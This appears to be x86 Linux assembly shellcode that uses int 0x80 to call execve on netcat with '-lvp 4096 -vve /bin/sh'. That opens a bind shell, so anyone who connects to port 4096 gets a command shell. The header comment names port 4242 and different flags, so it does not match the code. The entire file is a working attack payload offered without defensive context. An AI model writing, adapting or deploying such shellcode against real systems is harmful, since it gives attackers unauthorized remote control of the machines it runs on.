	;; execv("/usr/bin/nc", ["/usr/bin/nc", "-lp", "4242", "-e", "/bin/sh"], NULL)

	section .text
	global _start

    %include "../../../utils_linux_x86.asm"


_start:
    xor eax, eax
    mov al, 0xff
    sub esp, eax
	xor edx,edx
	push edx
	push dword '//nc'
	push dword '/bin'
    push dword '/usr'

	mov ebx, esp
	push edx
	push dword '-lvp'
	mov eax, esp
	push edx
	push dword '4096'
	mov ecx, esp
	push edx
	push dword '-vve'
	mov ebp, esp
	push edx
	push dword '//sh'
	push dword '/bin'
	mov edi, esp

	push edx
	push edi
	push ebp
	push ecx
	push eax
	push ebx
	mov ecx,esp

	xor eax,eax
	mov al,SYS_EXECV
	int 0x80
